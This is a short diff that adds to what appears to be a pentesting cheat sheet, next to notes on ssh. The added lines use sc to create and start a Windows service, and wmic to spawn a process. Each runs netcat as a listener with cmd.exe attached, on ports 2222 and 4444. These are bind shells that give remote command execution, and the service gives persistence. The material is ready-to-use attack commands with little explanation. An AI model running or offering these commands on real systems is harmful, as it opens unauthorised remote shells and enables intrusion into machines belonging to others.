@@ -84,6 +84,17 @@ ssh to connet
 ssh login_name@targetmachine -p 9000
 ```
 
+#### service usage
+```
+sc create ncservice2 binpath= "cmd.exe /k c:\tools\nc.exe -l -p 2222 -e cmd.exe"
+
+sc start ncservice2
+```
+
+#### Wimic
+```
+wmic process call create "c:\tools\nc.exe -l -p 4444 -e cmd.exe"
+```
 
 
 # Chapter 5
